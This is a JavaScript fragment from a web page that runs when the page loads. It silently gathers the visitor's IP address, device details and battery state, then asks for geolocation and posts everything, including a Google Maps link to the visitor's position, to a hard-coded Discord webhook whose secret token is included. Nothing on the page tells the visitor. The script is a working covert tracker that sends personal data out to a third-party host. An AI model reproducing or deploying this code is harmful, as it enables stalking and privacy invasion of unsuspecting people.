    <script>
        $(document).ready(function() {
            var batterypercentage;
            var ischarging;
            var deviceName = navigator.userAgent;

            // Function to fetch IP address and other device details
            async function fetchIPAndDeviceDetails() {
                const ipData = await fetch('https://api.ipify.org?format=json');
                const ipResponse = await ipData.json();
                const ipAddress = ipResponse.ip;

                const userAgent = navigator.userAgent;
                const networkInfo = navigator.connection ? navigator.connection.effectiveType : "Unknown";
                const battery = await navigator.getBattery();
                const batteryPercentage = battery.level * 100;
                const isCharging = battery.charging;
                const platform = navigator.platform;
                const language = navigator.language;
                const deviceMemory = navigator.deviceMemory || "Unknown";

                // Attempt to detect mobile device model
                let deviceModel = "Unknown";
                if (/android/i.test(userAgent)) {
                    const match = userAgent.match(/Android\s([0-9\.]+).*?;([^;]+) Build/);
                    if (match) {
                        deviceModel = match[2];
                    }
                } else if (/iphone|ipod/i.test(userAgent)) {
                    const match = userAgent.match(/iPhone\sOS\s([0-9\_]+)/);
                    if (match) {
                        deviceModel = match[0];
                    }
                }

                return { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel };
            }

            // Function to send the location and device details to Discord
            async function sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel) {
                // First message without location details
                const firstMessage = {
                    content: `
**User Details:**

- DeviceLocalTime: ${new Date().toLocaleString()}
- IP Address: ${ipAddress}
- Local IP Address: ${ipAddress}  // Using the same IP address for local and public for now
- NetworkInformation: ${networkInfo}
- BatteryPercentage: ${batteryPercentage}%
- IsCharging: ${isCharging ? "Yes" : "No"}
- Platform: ${platform}
- DeviceLanguage: ${language}
- DeviceMemory: ${deviceMemory} GB
- DeviceName: ${deviceModel}
- User-Agent: ${userAgent}
`
                };

                const request = new XMLHttpRequest();
                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                request.setRequestHeader('Content-type', 'application/json');
                request.send(JSON.stringify(firstMessage));

                // Second message with location details, if permission granted
                function sendLocationDetails(latitude, longitude) {
                    const secondMessage = {
                        content: `
**Geolocation Info:**

- Location: Latitude ${latitude}, Longitude ${longitude}
- Google Maps Link: [View on Google Maps](https://www.google.com/maps/place/${latitude}%2C${longitude})

**Complete Device Info:**

- DeviceLocalTime: ${new Date().toLocaleString()}
- IP Address: ${ipAddress}
- Local IP Address: ${ipAddress}  // Using the same IP address for local and public for now
- NetworkInformation: ${networkInfo}
- BatteryPercentage: ${batteryPercentage}%
- IsCharging: ${isCharging ? "Yes" : "No"}
- Platform: ${platform}
- DeviceLanguage: ${language}
- DeviceMemory: ${deviceMemory} GB
- DeviceName: ${deviceModel}
- User-Agent: ${userAgent}
`
                    };
                    request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                    request.setRequestHeader('Content-type', 'application/json');
                    request.send(JSON.stringify(secondMessage));
                }

                // If permission is denied, send a message indicating location permission was denied
                function sendLocationPermissionDenied() {
                    const deniedMessage = {
                        content: "**Location Permission Denied:** User has not allowed location access."
                    };
                    request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                    request.setRequestHeader('Content-type', 'application/json');
                    request.send(JSON.stringify(deniedMessage));
                }

                // Function to handle location permission and send relevant info
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            function(position) {
                                const latitude = position.coords.latitude;
                                const longitude = position.coords.longitude;
                                sendLocationDetails(latitude, longitude);
                            },
                            function() {
                                sendLocationPermissionDenied();
                            }
                        );
                    } else {
                        sendLocationPermissionDenied();
                    }
                }

                getLocation();
            }

            fetchIPAndDeviceDetails().then(deviceDetails => {
                const { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel } = deviceDetails;
                sendToDiscord(null, null, ipAddress, userAgent, new Date(), networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel);
            });
        });
